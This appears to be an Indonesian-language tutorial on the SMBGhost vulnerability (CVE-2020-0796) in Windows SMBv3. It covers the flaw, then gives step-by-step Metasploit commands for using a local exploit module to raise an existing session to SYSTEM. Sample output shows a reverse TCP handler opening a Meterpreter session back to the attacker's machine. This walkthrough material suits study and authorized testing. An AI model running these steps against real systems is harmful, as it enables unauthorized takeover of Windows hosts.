# CVE-2020-0796

## A. Apa itu CVE-2020-0796?

[CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796), juga dikenal sebagai SMBGhost, adalah kerentanan Remote Code Execution (RCE) dalam `SMBv3` (Server Message Block versi 3) yang ditemukan pada Windows 10 dan Windows Server versi `1903` dan `1909`.

Kerentanan ini memungkinkan penyerang jarak jauh untuk mengeksekusi kode arbitrer pada sistem target hanya dengan mengirimkan paket `SMBv3` yang dibuat khusus. Dalam kondisi tertentu, kerentanan ini juga bisa dimanfaatkan untuk Local Privilege Escalation (LPE).

## B. Detail Teknis
- CVE ID: `CVE-2020-0796`
- Tanggal Rilis: `10 Maret 2020`
- Tipe: Remote Code Execution (RCE) + Local Privilege Escalation (LPE)
- Protokol: `SMBv3`
- Komponen: `srv2.sys`
- Platform: `Windows 10` / `Server 1903` & `1909`
- Arsitektur: `x86` dan `x64`
- Skor CVSS: `10.0` (Kritis)

## C. Sistem yang Rentan

Untuk melihat semua sistem yang rentan terhadap `CVE-2020-0796`, anda bisa melihatnya di dokumentasi resmi Microsoft: [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)

## D. Langkah Penggunaan di Metasploit

1. Dapatkan Akses Awal (User Biasa):

   ```
   msf6 > sessions          # Lihat sesi yang ada
   msf6 > sessions -i 1     # Masuk ke sesi dengan ID 1
   msf6 > getuid            # Melihat user saat ini
   msf6 > sysinfo           # Informasi sistem target
   ```

2. Keluar dari Sesi Meterpreter:
   
   ```
   msf6 > background
   ```

3. Gunakan Modul Exploit CVE-2020-0796:

   ```
   msf6 > use exploit/windows/local/cve_2020_0796_smbghost
   ```

4. Setting Parameter Penting:

   ```
   msf6 > set SESSION <ID>
   msf6 > set PAYLOAD <PAYLOAD>
   msf6 > set LHOST <IP_ATTACKER>
   msf6 > set LPORT <PORT_LISTENER>
   msf6 > set TARGET <ID>
   msf6 > set VERBOSE true
   ```

   > Untuk ID target bisa dilihat dengan:

   ```
   msf6 > show targets
   ```

5. Jalankan Exploit:

   ```
   msf6 > exploit
   ```

   Jika hasil output-nya seperti ini:

   ```
   [*] Started reverse TCP handler on 192.168.1.42:4444 
   [*] Running automatic check ("set AutoCheck false" to disable)
   [*] Windows Build Number = 10.0.18363.0
   [+] The target appears to be vulnerable.
   [*] Reflectively injecting the exploit DLL and executing it...
   [*] Launching msiexec to host the DLL...
   [+] Process 7076 launched.
   [*] Reflectively injecting the DLL into 7076...
   [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
   [*] Sending stage (203846 bytes) to 192.168.1.51
   [*] Meterpreter session 29 opened (192.168.1.42:4444 -> 192.168.1.51:49719) at 2025-05-14 22:39:30 +0700

   meterpreter >
   ```

   Itu artinya kita sudah mendapatkan akses tertinggi dari sistem. Untuk mengeceknya, ketikkan perintah berikut:

   ```
   meterpreter > getuid 
   ```

   Hasil output-nya seperti ini:

   ```
   meterpreter > getuid 
   Server username: NT AUTHORITY\SYSTEM
   meterpreter > 
   ```

   > Keterangan: `NT AUTHORITY\SYSTEM` adalah akun tertinggi di sistem Windows itu setara dengan `root` pada sistem Linux.
